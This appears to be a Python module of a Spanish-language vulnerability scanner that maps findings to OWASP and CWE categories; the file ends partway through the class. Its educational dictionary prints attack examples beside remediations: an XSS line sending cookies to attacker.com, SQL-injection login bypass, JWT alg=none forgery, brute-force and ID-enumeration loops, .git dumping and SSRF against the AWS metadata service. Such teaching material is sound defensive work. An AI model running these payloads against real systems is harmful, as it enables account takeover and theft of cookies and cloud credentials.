#!/usr/bin/env python3
"""
Interpreter Module - Scan Agent
================================
Módulo encargado de interpretar los datos parseados, clasificar vulnerabilidades
según CVSS 3.1 y mapear a categorías OWASP Top 10.

Autor: Scan Agent Team
Versión: 1.0.0
"""

import json
from typing import Dict, List, Any, Tuple, Optional
from datetime import datetime

try:
    from scanagent.vuln_db import get_default_db
    _VULNDB_AVAILABLE = True
except ImportError:
    _VULNDB_AVAILABLE = False


class VulnerabilityInterpreter:
    """
    Clase para interpretar y clasificar vulnerabilidades detectadas.
    """
    
    # Mapeo de categorías OWASP Top 10 2021 (Web)
    OWASP_TOP_10 = {
        "A01": "Broken Access Control",
        "A02": "Cryptographic Failures",
        "A03": "Injection",
        "A04": "Insecure Design",
        "A05": "Security Misconfiguration",
        "A06": "Vulnerable and Outdated Components",
        "A07": "Identification and Authentication Failures",
        "A08": "Software and Data Integrity Failures",
        "A09": "Security Logging and Monitoring Failures",
        "A10": "Server-Side Request Forgery (SSRF)"
    }

    # Mapeo de categorías OWASP API Security Top 10 2023
    OWASP_API_TOP_10 = {
        "API1:2023": "Broken Object Level Authorization",
        "API2:2023": "Broken Authentication",
        "API3:2023": "Broken Object Property Level Authorization",
        "API4:2023": "Unrestricted Resource Consumption",
        "API5:2023": "Broken Function Level Authorization",
        "API6:2023": "Unrestricted Access to Sensitive Business Flows",
        "API7:2023": "Server Side Request Forgery",
        "API8:2023": "Security Misconfiguration",
        "API9:2023": "Improper Inventory Management",
        "API10:2023": "Unsafe Consumption of APIs",
    }

    # CWE más relevantes por categoría API Top 10 2023
    API_TO_CWE = {
        "API1:2023":  "CWE-639 — Authorization Bypass Through User-Controlled Key",
        "API2:2023":  "CWE-287 — Improper Authentication",
        "API3:2023":  "CWE-213 — Exposure of Sensitive Information / CWE-915 — Mass Assignment",
        "API4:2023":  "CWE-770 — Allocation of Resources Without Limits",
        "API5:2023":  "CWE-285 — Improper Authorization",
        "API6:2023":  "CWE-799 — Improper Control of Interaction Frequency",
        "API7:2023":  "CWE-918 — Server-Side Request Forgery (SSRF)",
        "API8:2023":  "CWE-16 — Configuration / CWE-614 — Sensitive Cookie Without Secure",
        "API9:2023":  "CWE-1059 — Insufficient Technical Documentation",
        "API10:2023": "CWE-20 — Improper Input Validation",
    }

    # CWE mapping para OWASP Web Top 10 2021
    OWASP_WEB_CWE = {
        "A01:2021": "CWE-284 — Improper Access Control / CWE-285 — Improper Authorization",
        "A02:2021": "CWE-326 — Inadequate Encryption Strength / CWE-916 — Weak Password Hash",
        "A03:2021": "CWE-89 — SQL Injection / CWE-79 — XSS / CWE-78 — OS Command Injection",
        "A04:2021": "CWE-209 — Error Message Info Exposure / CWE-522 — Weak Credentials",
        "A05:2021": "CWE-16 — Configuration / CWE-614 — Sensitive Cookie Without Secure Flag",
        "A06:2021": "CWE-1104 — Use of Unmaintained Third Party Components",
        "A07:2021": "CWE-287 — Improper Authentication / CWE-307 — Brute Force Prevention",
        "A08:2021": "CWE-345 — Insufficient Verification of Data Authenticity",
        "A09:2021": "CWE-778 — Insufficient Logging / CWE-223 — Omission of Security-relevant Info",
        "A10:2021": "CWE-918 — Server-Side Request Forgery (SSRF)",
    }

    # Knowledge base educativo: "¿por qué es peligroso?", payload, remediación, CWE, cheat sheet
    EDUCATIONAL_DATA: Dict[str, Dict[str, str]] = {
        # ── Por tipo de indicador ─────────────────────────────────────────
        "missing_security_headers": {
            "por_que_peligroso": (
                "Sin headers de seguridad HTTP el navegador no puede proteger al usuario. "
                "Un atacante puede incrustar la página en un iframe (clickjacking), "
                "inyectar scripts maliciosos (XSS stored) o robar cookies de sesión sin "
                "que el servidor lo detecte."
            ),
            "ejemplo_payload": (
                "<!-- Clickjacking: la víctima cree hacer clic en su banco -->\n"
                "<iframe src='https://victima.com/transferir?monto=5000&destino=atacante'\n"
                "        style='opacity:0; position:absolute; top:0; left:0;\n"
                "               width:100%; height:100%; z-index:999'>\n"
                "</iframe>\n"
                "<button style='position:absolute;top:50%;left:50%'>¡Haz clic aquí!</button>"
            ),
            "como_remediarlo": (
                "# Nginx — bloque server{}\n"
                "add_header X-Frame-Options \"SAMEORIGIN\" always;\n"
                "add_header X-Content-Type-Options \"nosniff\" always;\n"
                "add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;\n"
                "add_header Content-Security-Policy \"default-src 'self'\" always;\n"
                "add_header Referrer-Policy \"strict-origin-when-cross-origin\" always;\n\n"
                "# Apache — .htaccess\n"
                "Header always set X-Frame-Options \"SAMEORIGIN\"\n"
                "Header always set X-Content-Type-Options \"nosniff\""
            ),
            "cheat_sheet_url": "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html",
            "cwe": "CWE-693 — Protection Mechanism Failure",
        },
        "information_disclosure": {
            "por_que_peligroso": (
                "Revelar la versión exacta del servidor (Apache/2.4.1, PHP/7.2) permite al "
                "atacante buscar CVEs específicos sin necesidad de prueba y error. "
                "Es el primer paso del reconocimiento: recolectar información sin levantar alertas."
            ),
            "ejemplo_payload": (
                "# El atacante sólo necesita un curl:\n"
                "$ curl -I https://victima.com\n"
                "HTTP/1.1 200 OK\n"
                "Server: Apache/2.4.1 (Ubuntu)   <-- CVE-2021-41773 (path traversal + RCE)\n"
                "X-Powered-By: PHP/7.2.0          <-- sin soporte desde dic-2019\n\n"
                "# Buscar en: https://www.cvedetails.com/version-search.php"
            ),
            "como_remediarlo": (
                "# Apache — deshabilitar banner\n"
                "ServerTokens Prod\n"
                "ServerSignature Off\n\n"
                "# Nginx\n"
                "server_tokens off;\n\n"
                "# PHP — php.ini\n"
                "expose_php = Off\n\n"
                "# Node.js (Express)\n"
                "app.disable('x-powered-by');"
            ),
            "cheat_sheet_url": "https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html",
            "cwe": "CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor",
        },
        "ruta_sensible_expuesta": {
            "por_que_peligroso": (
                "Rutas como /.git, /backup, /admin, /phpMyAdmin exponen código fuente, "
                "credenciales o paneles de control sin autenticación. "
                "Una carpeta .git accesible permite reconstruir todo el historial del código "
                "incluyendo contraseñas y claves API hardcodeadas."
            ),
            "ejemplo_payload": (
                "# Dump de repositorio Git expuesto\n"
                "$ git clone https://victima.com/.git repo_robado\n"
                "# Resultado: historial completo, claves API, passwords en texto plano\n\n"
                "# O con git-dumper:\n"
                "$ python3 git_dumper.py https://victima.com/.git/ ./dump\n"
                "$ grep -r 'password\\|secret\\|api_key' dump/"
            ),
            "como_remediarlo": (
                "# Nginx — bloquear archivos ocultos y rutas sensibles\n"
                "location ~ /\\.(?!well-known) {\n"
                "    deny all;\n"
                "    return 404;\n"
                "}\n\n"
                "# Apache — .htaccess\n"
                "RedirectMatch 404 /\\.git\n"
                "Options -Indexes\n\n"
                "# Regla general: nunca hacer deploy con .git en el document root"
            ),
            "cheat_sheet_url": "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
            "cwe": "CWE-548 — Exposure of Information Through Directory Listing",
        },
        "ssl_vulnerable": {
            "por_que_peligroso": (
                "TLS 1.0/1.1 y cifrados débiles (RC4, 3DES) permiten ataques BEAST, POODLE "
                "y SWEET32 que descifran el tráfico HTTPS. Un atacante en la misma red WiFi "
                "puede interceptar credenciales y tokens de sesión en tránsito."
            ),
            "ejemplo_payload": (
                "# Verificar cifrados con testssl.sh\n"
                "$ testssl.sh https://victima.com\n"
                "# Buscar: TLSv1.0 ENABLED, RC4 cipher, anonymous DH\n\n"
                "# Con nmap\n"
                "$ nmap --script ssl-enum-ciphers -p 443 victima.com\n"
                "# POODLE: SSLv3 habilitado → tráfico descifrable"
            ),
            "como_remediarlo": (
                "# Nginx — sólo TLS 1.2 y 1.3\n"
                "ssl_protocols TLSv1.2 TLSv1.3;\n"
                "ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;\n"
                "ssl_prefer_server_ciphers off;\n\n"
                "# Apache\n"
                "SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1\n"
                "SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256"
            ),
            "cheat_sheet_url": "https://cheatsheetseries.owasp.org/cheatsheets/TLS_Cipher_String_Cheat_Sheet.html",
            "cwe": "CWE-326 — Inadequate Encryption Strength",
        },
        # ── Por categoría OWASP Web Top 10 2021 ──────────────────────────
        "A01:2021": {
            "por_que_peligroso": (
                "Broken Access Control (#1 OWASP 2021) permite acceder a datos de otros usuarios "
                "cambiando un ID en la URL (/user/123 → /user/124), escalar privilegios "
                "o acceder a funciones administrativas sin ser administrador."
            ),
            "ejemplo_payload": (
                "# IDOR — acceder a pedidos de otro usuario\n"
                "GET /api/orders/1001  → mis pedidos (OK)\n"
                "GET /api/orders/1002  → pedidos de otro usuario (IDOR!)\n\n"
                "# Escalada de privilegios via parámetro oculto\n"
                "POST /api/cambiar-rol\n"
                "{\"userId\": 42, \"role\": \"admin\"}  ← si el servidor no verifica"
            ),
            "como_remediarlo": (
                "# Verificar en SERVIDOR que el recurso pertenece al usuario\n\n"
                "# MAL (vulnerable):\n"
                "def get_order(order_id):\n"
                "    return db.query(Order).filter(Order.id == order_id).first()\n\n"
                "# BIEN (seguro):\n"
                "def get_order(order_id, current_user):\n"
                "    order = db.query(Order).filter(\n"
                "        Order.id == order_id,\n"
                "        Order.user_id == current_user.id  # ← verificación de propietario\n"
                "    ).first()\n"
                "    if not order:\n"
                "        raise HTTPException(403, 'Forbidden')"
            ),
            "cheat_sheet_url": "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html",
            "cwe": "CWE-284 — Improper Access Control / CWE-639 — IDOR",
        },
        "A02:2021": {
            "por_que_peligroso": (
                "Fallos criptográficos exponen datos sensibles: contraseñas en MD5 son "
                "crackeables en segundos con GPU, transmisión sin HTTPS expone sesiones. "
                "Un dump de BD con MD5 equivale a tener todas las contraseñas en texto plano."
            ),
            "ejemplo_payload": (
                "# Crackear MD5 con hashcat en GPU\n"
                "$ hashcat -m 0 hashes.txt rockyou.txt\n"
                "5f4dcc3b5aa765d61d8327deb882cf99 → 'password'  (< 1 segundo)\n\n"
                "# O en línea: crackstation.net\n"
                "# MD5('admin123') = 0192023a7bbd73250516f069df18b500 → resultado inmediato"
            ),
            "como_remediarlo": (
                "# Python — usar bcrypt o argon2id para contraseñas\n"
                "from passlib.hash import bcrypt\n\n"
                "# Guardar contraseña\n"
                "hashed = bcrypt.hash(plain_password)  # salt automático incluido\n\n"
                "# Verificar\n"
                "ok = bcrypt.verify(plain_password, hashed)\n\n"
                "# NUNCA usar: MD5, SHA1, SHA256 sin salt para contraseñas\n"
                "# SIEMPRE usar: bcrypt (cost>=12), scrypt, argon2id"
            ),
            "cheat_sheet_url": "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html",
            "cwe": "CWE-326 — Inadequate Encryption Strength / CWE-916 — Weak Password Hash",
        },
        "A03:2021": {
            "por_que_peligroso": (
                "Injection (SQL, Command, LDAP, XSS) permite modificar consultas de BD, "
                "ejecutar comandos en el servidor, o robar sesiones de otros usuarios. "
                "SQL Injection puede dar acceso total a la BD con una sola petición."
            ),
            "ejemplo_payload": (
                "# SQL Injection clásico — bypass de login\n"
                "Usuario: admin' --\n"
                "Contraseña: cualquiera\n"
                "Query: SELECT * FROM users WHERE user='admin'--' AND pass='x'\n"
                "        → el '--' comenta el resto, autenticación bypasseada\n\n"
                "# XSS Reflejado — robo de sesión\n"
                "https://victima.com/search?q=<script>\n"
                "  document.location='https://attacker.com/?c='+document.cookie\n"
                "</script>"
            ),
            "como_remediarlo": (
                "# SQL — SIEMPRE usar consultas parametrizadas\n"
                "# MAL (vulnerable a SQL Injection):\n"
                "query = f\"SELECT * FROM users WHERE user='{username}'\"\n\n"
                "# BIEN (parameterized query):\n"
                "cursor.execute(\"SELECT * FROM users WHERE user = %s\", (username,))\n\n"
                "# XSS — escapar salida antes de renderizar en HTML\n"
                "from markupsafe import escape\n"
                "safe_html = escape(user_input)  # < → &lt;  > → &gt;"
            ),
            "cheat_sheet_url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
            "cwe": "CWE-89 — SQL Injection / CWE-79 — XSS / CWE-78 — OS Command Injection",
        },
        "A05:2021": {
            "por_que_peligroso": (
                "Security Misconfiguration incluye CORS abierto (*), mensajes de error con "
                "stack traces, directorios listables y cuentas por defecto activas. "
                "Es la más común porque es fácil de introducir durante el desarrollo."
            ),
            "ejemplo_payload": (
                "# CORS mal configurado — petición cross-origin con credenciales\n"
                "Access-Control-Allow-Origin: *\n"
                "Access-Control-Allow-Credentials: true  ← inválido con *, pero...\n\n"
                "# Error verbose — revela rutas internas y versiones\n"
                "500 Internal Server Error\n"
                "Traceback: /home/ubuntu/app/models/user.py line 42\n"
                "sqlalchemy.exc.OperationalError: (1045) Access denied for 'root'@'localhost'"
            ),
            "como_remediarlo": (
                "# CORS restrictivo (FastAPI)\n"
                "app.add_middleware(CORSMiddleware,\n"
                "    allow_origins=['https://miapp.com'],  # nunca '*' con credentials\n"
                "    allow_credentials=True,\n"
                ")\n\n"
                "# Páginas de error genéricas (Flask)\n"
                "@app.errorhandler(500)\n"
                "def internal_error(e):\n"
                "    app.logger.error(f'Error: {e}')  # loguear internamente\n"
                "    return 'Error interno', 500       # respuesta genérica al cliente"
            ),
            "cheat_sheet_url": "https://cheatsheetseries.owasp.org/cheatsheets/Infrastructure_Security_Cheat_Sheet.html",
            "cwe": "CWE-16 — Configuration / CWE-614 — Sensitive Cookie Without Secure Flag",
        },
        "A07:2021": {
            "por_que_peligroso": (
                "Fallos de autenticación permiten fuerza bruta sin bloqueo, tokens de sesión "
                "predecibles o bypass de MFA. Con 1M de contraseñas de la lista rockyou.txt "
                "un atacante puede comprometer cuentas débiles en minutos."
            ),
            "ejemplo_payload": (
                "# Brute force sin rate limiting\n"
                "for password in open('rockyou.txt'):\n"
                "    r = requests.post('/login',\n"
                "        json={'user': 'admin', 'pass': password.strip()})\n"
                "    if 'Bienvenido' in r.text:\n"
                "        print(f'Encontrado: {password}')\n"
                "        break\n\n"
                "# JWT alg=none — bypass de firma\n"
                "header = base64url('{\"alg\":\"none\",\"typ\":\"JWT\"}')\n"
                "payload = base64url('{\"user\":\"admin\",\"role\":\"superadmin\"}')\n"
                "token = f\"{header}.{payload}.\"  # sin firma"
            ),
            "como_remediarlo": (
                "# Rate limiting (Flask-Limiter)\n"
                "from flask_limiter import Limiter\n"
                "limiter = Limiter(app, key_func=get_remote_address)\n\n"
                "@app.route('/login', methods=['POST'])\n"
                "@limiter.limit('5 per minute')  # máx 5 intentos/min por IP\n"
                "def login(): ...\n\n"
                "# JWT: especificar algoritmo explícitamente\n"
                "payload = jwt.decode(token, SECRET, algorithms=['HS256'])\n"
                "# Bloquear cuenta tras 5 intentos + implementar MFA (TOTP)"
            ),
            "cheat_sheet_url": "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html",
            "cwe": "CWE-287 — Improper Authentication / CWE-307 — Brute Force",
        },
        "A10:2021": {
            "por_que_peligroso": (
                "SSRF permite usar el servidor como proxy para atacar servicios internos. "
                "En cloud (AWS/GCP/Azure) puede robar las credenciales IAM del metadata service "
                "(169.254.169.254), dando acceso total a toda la infraestructura cloud."
            ),
            "ejemplo_payload": (
                "# SSRF hacia metadata service de AWS\n"
                "GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
                "→ responde con el nombre del rol IAM\n\n"
                "GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role\n"
                "→ responde con AccessKeyId, SecretAccessKey, Token\n"
                "→ el atacante tiene acceso total a AWS con esas credenciales"
            ),
            "como_remediarlo": (
                "# Validar que la URL no apunte a rangos privados\n"
                "import ipaddress, socket\n"
                "from urllib.parse import urlparse\n\n"
                "BLOCKED = ['10.0.0.0/8','172.16.0.0/12',\n"
                "           '192.168.0.0/16','169.254.0.0/16']\n\n"
                "def safe_url(url):\n"
                "    host = urlparse(url).hostname\n"
                "    ip = socket.gethostbyname(host)\n"
                "    return not any(\n"
                "        ipaddress.ip_address(ip) in ipaddress.ip_network(r)\n"
                "        for r in BLOCKED\n"
                "    )"
            ),
            "cheat_sheet_url": "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
            "cwe": "CWE-918 — Server-Side Request Forgery (SSRF)",
        },
        # ── Por categoría OWASP API Security Top 10 2023 ─────────────────
        "API1:2023": {
            "por_que_peligroso": (
                "BOLA/IDOR en APIs permite acceder a objetos de otros usuarios cambiando un ID. "
                "Las APIs suelen exponer directamente IDs de BD, haciendo el ataque trivial "
                "y automatizable con un script de pocas líneas."
            ),
            "ejemplo_payload": (
                "# Script de enumeración BOLA\n"
                "for order_id in range(1000, 2000):\n"
                "    r = requests.get(\n"
                "        f'/api/v1/orders/{order_id}',\n"
                "        headers={'Authorization': f'Bearer {my_token}'}\n"
                "    )\n"
                "    if r.status_code == 200:\n"
                "        print(f'ID {order_id} accesible: {r.json()[\"email\"]}')"
            ),
            "como_remediarlo": (
                "# FastAPI — filtrar siempre por usuario autenticado\n\n"
                "# MAL:\n"
                "@app.get('/api/orders/{order_id}')\n"
                "def get_order(order_id: int):\n"
                "    return db.query(Order).filter(Order.id == order_id).first()\n\n"
                "# BIEN:\n"
                "@app.get('/api/orders/{order_id}')\n"
                "def get_order(order_id: int, user=Depends(get_current_user)):\n"
                "    order = db.query(Order).filter(\n"
                "        Order.id == order_id,\n"
                "        Order.user_id == user.id  # ← clave\n"
                "    ).first()\n"
                "    if not order: raise HTTPException(403)"
            ),
            "cheat_sheet_url": "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html",
            "cwe": "CWE-639 — Authorization Bypass Through User-Controlled Key",
        },
        "API2:2023": {
            "por_que_peligroso": (
                "Broken Authentication en APIs incluye tokens JWT sin expiración, aceptar "
                "alg=none, o endpoints sin autenticación. Permite impersonar cualquier usuario "
                "o acceder a datos privados sin credenciales válidas."
            ),
            "ejemplo_payload": (
                "# JWT algorithm confusion — forzar alg=none\n"
                "import base64, json\n\n"
                "def b64url(s): return base64.b64encode(s.encode()).decode().rstrip('=')\n\n"
                "header  = b64url('{\"alg\":\"none\",\"typ\":\"JWT\"}')\n"
                "payload = b64url('{\"user_id\":1,\"role\":\"admin\"}')\n"
                "token   = f'{header}.{payload}.'  # sin firma\n\n"
                "requests.get('/api/admin',\n"
                "    headers={'Authorization': f'Bearer {token}'})"
            ),
            "como_remediarlo": (
                "# Validar JWT con lista blanca de algoritmos\n"
                "import jwt\n\n"
                "def verify_token(token: str):\n"
                "    return jwt.decode(\n"
                "        token,\n"
                "        SECRET_KEY,\n"
                "        algorithms=['HS256'],  # NUNCA dejar que el token elija\n"
                "        options={'require': ['exp', 'iat']},  # exigir expiración\n"
                "    )\n\n"
                "# Expiración corta: access token 15min, refresh token 7d"
            ),
            "cheat_sheet_url": "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html",
            "cwe": "CWE-287 — Improper Authentication",
        },
        "API4:2023": {
            "por_que_peligroso": (
                "Sin rate limiting un atacante puede hacer miles de peticiones por segundo: "
                "enumerar usuarios, hacer brute force de OTPs de 4 dígitos (10k intentos en "
                "30 segundos), o tirar el servidor con una sola máquina."
            ),
            "ejemplo_payload": (
                "# Fuerza bruta de OTP de 4 dígitos sin rate limiting\n"
                "for code in range(0, 10000):\n"
                "    r = requests.post('/api/verify-otp',\n"
                "        json={'code': f'{code:04d}'})\n"
                "    if r.json().get('valid'):\n"
                "        print(f'OTP válido: {code:04d}')\n"
                "        break\n"
                "# Sin rate limiting: 10k intentos en ~30 segundos → OTP comprometido"
            ),
            "como_remediarlo": (
                "# FastAPI con slowapi\n"
                "from slowapi import Limiter\n"
                "from slowapi.util import get_remote_address\n\n"
                "limiter = Limiter(key_func=get_remote_address)\n\n"
                "@app.post('/api/verify-otp')\n"
                "@limiter.limit('5/minute')  # 5 intentos por minuto por IP\n"
                "async def verify_otp(request: Request, body: OTPSchema):\n"
                "    ...\n\n"
                "# También: OTP con expiración corta (30-60 seg), invalidar tras uso"
            ),
            "cheat_sheet_url": "https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html",
            "cwe": "CWE-770 — Allocation of Resources Without Limits",
        },
        "API7:2023": {
            "por_que_peligroso": (
                "SSRF en APIs permite al atacante controlar URLs de webhook o callback "
                "para que el servidor haga peticiones a servicios internos. En cloud, "
                "puede robar credenciales IAM del metadata service y comprometer toda la infra."
            ),
            "ejemplo_payload": (
                "# SSRF via webhook con URL controlada por el atacante\n"
                "POST /api/webhooks\n"
                "Content-Type: application/json\n\n"
                "{\"callback_url\": \"http://169.254.169.254/latest/meta-data/iam/\"}\n\n"
                "# El servidor hace la petición y devuelve el cuerpo de la respuesta\n"
                "# → el atacante obtiene el nombre del rol IAM\n"
                "# Siguiente paso: robar credenciales con /security-credentials/ROLE-NAME"
            ),
            "como_remediarlo": (
                "# Validar URL antes de hacer peticiones externas\n"
                "import ipaddress, socket\n"
                "from urllib.parse import urlparse\n\n"
                "PRIVATE_NETS = [\n"
                "    '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16',\n"
                "    '169.254.0.0/16', '127.0.0.0/8'\n"
                "]\n\n"
                "def is_safe_url(url: str) -> bool:\n"
                "    ip = socket.gethostbyname(urlparse(url).hostname)\n"
                "    return not any(\n"
                "        ipaddress.ip_address(ip) in ipaddress.ip_network(n)\n"
                "        for n in PRIVATE_NETS\n"
                "    )"
            ),
            "cheat_sheet_url": "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
            "cwe": "CWE-918 — Server-Side Request Forgery (SSRF)",
        },
        "API8:2023": {
            "por_que_peligroso": (
                "Mala configuración en APIs incluye Swagger/OpenAPI sin auth, "
                "endpoints /debug o /actuator activos en producción, y CORS con origen *. "
                "Un Swagger público revela todos los endpoints y parámetros al atacante."
            ),
            "ejemplo_payload": (
                "# Swagger UI sin auth → inventario completo de la API\n"
                "GET /api/swagger-ui/index.html  → 200 OK  (todos los endpoints visibles)\n\n"
                "# Spring Boot Actuator expuesto\n"
                "GET /actuator/env       → variables de entorno con passwords\n"
                "GET /actuator/heapdump  → dump de memoria con JWT tokens activos\n"
                "GET /actuator/mappings  → mapa completo de rutas internas"
            ),
            "como_remediarlo": (
                "# Deshabilitar Swagger en producción (FastAPI)\n"
                "ENV = os.getenv('ENVIRONMENT', 'dev')\n\n"
                "app = FastAPI(\n"
                "    docs_url='/docs' if ENV != 'production' else None,\n"
                "    redoc_url='/redoc' if ENV != 'production' else None,\n"
                ")\n\n"
                "# CORS restrictivo — nunca '*' con credenciales\n"
                "app.add_middleware(CORSMiddleware,\n"
                "    allow_origins=['https://miapp.com'],\n"
                "    allow_credentials=True,\n"
                ")"
            ),
            "cheat_sheet_url": "https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html",
            "cwe": "CWE-16 — Configuration",
        },
    }
    
    # Mapeo de severidad a score CVSS
    CVSS_SEVERITY = {
        "none": (0.0, 0.0),
        "baja": (0.1, 3.9),
        "media": (4.0, 6.9),
        "alta": (7.0, 8.9),
        "critica": (9.0, 10.0)
    }
    
    def __init__(self, parsed_data: Dict[str, Any], use_vuln_db: bool = True,
                 vuln_db_path: Optional[str] = None):
        """
        Inicializa el intérprete con datos parseados.

        Args:
            parsed_data:   Datos en formato JSON del parser
            use_vuln_db:   Enriquecer hallazgos con NVD/CISA KEV (requiere red)
            vuln_db_path:  Ruta al SQLite de VulnDB (default: ./data/vuln_cache.db)
        """
        self.data = parsed_data
        self.vulnerabilities = []
        self.attack_surface = {}
        self.technologies = {}
        self.risk_summary = {
            "critica": 0,
            "alta": 0,
            "media": 0,
            "baja": 0,
            "total": 0
        }
        # VulnDB — enriquecimiento con datos actualizados de CVE/KEV
        self.vuln_db = None
        if use_vuln_db and _VULNDB_AVAILABLE:
            try:
                self.vuln_db = get_default_db(db_path=vuln_db_path)
            except Exception:
                pass
    
    def analyze(self) -> Dict[str, Any]:
        """
        Realiza el análisis completo de las vulnerabilidades.
        
        Returns:
            Diccionario con el análisis completo
        """
        print("\n" + "=" * 60)
        print("INICIANDO ANÁLISIS DE VULNERABILIDADES")
        print("=" * 60)
        
        # 1. Analizar superficie de ataque
        self._analyze_attack_surface()
        
        # 2. Detectar tecnologías
        self._detect_technologies()
        
        # 3. Procesar vulnerabilidades
        self._process_vulnerabilities()
        
        # 4. Enriquecer con VulnDB (NVD + CISA KEV)
        self._enrich_with_vuln_db()

        # 5. Enriquecer con datos educativos (CWE, payload, remediación, cheat sheet)
        self._enrich_educational()

        # 6. Clasificar riesgos
        self._classify_risks()

        # 7. Generar recomendaciones
        recommendations = self._generate_recommendations()

        # 8. Compilar análisis completo
        analysis = {
            "metadata": {
                "timestamp": datetime.now().isoformat(),
                "target_ip": self.data.get("target_ip", "unknown"),
                "total_vulnerabilities": len(self.vulnerabilities)
            },
            "resumen_ejecutivo": self._generate_executive_summary(),
            "superficie_ataque": self.attack_surface,
            "tecnologias_detectadas": self.technologies,
            "vulnerabilidades": self.vulnerabilities,
            "resumen_riesgos": self.risk_summary,
            "recomendaciones": recommendations
        }
        
        print("\n[OK] Análisis completado")
        print(f"     Vulnerabilidades totales: {len(self.vulnerabilities)}")
        print(f"     Críticas: {self.risk_summary['critica']}")
        print(f"     Altas: {self.risk_summary['alta']}")
        print(f"     Medias: {self.risk_summary['media']}")
        print(f"     Bajas: {self.risk_summary['baja']}")
        
        return analysis
    
    def _analyze_attack_surface(self) -> None:
        """
        Analiza la superficie de ataque basándose en puertos y servicios.
        """
        print("\n[*] Analizando superficie de ataque...")
        
        puertos = self.data.get("puertos", [])
        rutas = self.data.get("rutas_descubiertas", [])
        
        self.attack_surface = {
            "puertos_expuestos": len(puertos),
            "servicios_activos": len(self.data.get("servicios_detectados", [])),
            "endpoints_descubiertos": len(rutas),
            "detalles_puertos": [],
            "rutas_criticas": []
        }
        
        # Analizar puertos críticos
        puertos_criticos = [21, 22, 23, 3306, 3389, 5432, 27017, 6379]
        
        for puerto in puertos:
            puerto_num = puerto.get("puerto")
            es_critico = puerto_num in puertos_criticos
            
            self.attack_surface["detalles_puertos"].append({
                "puerto": puerto_num,
                "servicio": puerto.get("servicio"),
                "version": puerto.get("version"),
                "critico": es_critico,
                "razon": self._get_port_risk_reason(puerto_num) if es_critico else None
            })
        
        # Analizar rutas críticas
        rutas_sensibles = ['/admin', '/api', '/config', '/.git', '/backup', '/database']
        
        for ruta in rutas:
            path = ruta.get("ruta", "")
            if any(sensitive in path.lower() for sensitive in rutas_sensibles):
                self.attack_surface["rutas_criticas"].append({
                    "ruta": path,
                    "codigo_http": ruta.get("codigo_http"),
                    "accesible": ruta.get("codigo_http") == 200
                })
        
        print(f"    Puertos expuestos: {self.attack_surface['puertos_expuestos']}")
        print(f"    Rutas críticas: {len(self.attack_surface['rutas_criticas'])}")
    
    def _detect_technologies(self) -> None:
        """
        Detecta y clasifica las tecnologías utilizadas.
        """
        print("\n[*] Detectando tecnologías...")
        
        versiones = self.data.get("versiones", {})
        servicios = self.data.get("servicios_detectados", [])
        headers = self.data.get("metadata_http", {}).get("headers", {})
        
        self.technologies = {
            "servidor_web": None,
            "lenguajes": [],
            "frameworks": [],
            "bases_datos": [],
            "ssl_tls": None,
            "otros": []
        }
        
        # Detectar servidor web
        for key, value in versiones.items():
            if "apache" in value.lower():
                self.technologies["servidor_web"] = {
                    "nombre": "Apache",
                    "version": value,
                    "potencialmente_vulnerable": self._check_version_vulnerability("Apache", value)
                }
            elif "nginx" in value.lower():
                self.technologies["servidor_web"] = {
                    "nombre": "Nginx",
                    "version": value,
                    "potencialmente_vulnerable": self._check_version_vulnerability("Nginx", value)
                }
            elif "iis" in value.lower():
                self.technologies["servidor_web"] = {
                    "nombre": "IIS",
                    "version": value,
                    "potencialmente_vulnerable": self._check_version_vulnerability("IIS", value)
                }
        
        # Detectar lenguajes desde headers
        if "X-Powered-By" in headers:
            powered_by = headers["X-Powered-By"]
            if "php" in powered_by.lower():
                self.technologies["lenguajes"].append({
                    "nombre": "PHP",
                    "version": powered_by
                })
            elif "asp.net" in powered_by.lower():
                self.technologies["lenguajes"].append({
                    "nombre": "ASP.NET",
                    "version": powered_by
                })
        
        # Detectar bases de datos desde puertos
        for servicio in servicios:
            servicio_nombre = servicio.get("servicio", "").lower()
            if "mysql" in servicio_nombre:
                self.technologies["bases_datos"].append({
                    "nombre": "MySQL",
                    "puerto": servicio.get("puerto"),
                    "version": servicio.get("version")
                })
            elif "postgresql" in servicio_nombre or "postgres" in servicio_nombre:
                self.technologies["bases_datos"].append({
                    "nombre": "PostgreSQL",
                    "puerto": servicio.get("puerto"),
                    "version": servicio.get("version")
                })
            elif "mongodb" in servicio_nombre or "mongo" in servicio_nombre:
                self.technologies["bases_datos"].append({
                    "nombre": "MongoDB",
                    "puerto": servicio.get("puerto"),
                    "version": servicio.get("version")
                })
        
        # Detectar SSL/TLS
        tls_version = self.data.get("metadata_http", {}).get("tls_version")
        if tls_version:
            self.technologies["ssl_tls"] = {
                "version": tls_version,
                "seguro": "TLSv1.2" in tls_version or "TLSv1.3" in tls_version
            }
        
        print(f"    Servidor web: {self.technologies['servidor_web']['nombre'] if self.technologies['servidor_web'] else 'No detectado'}")
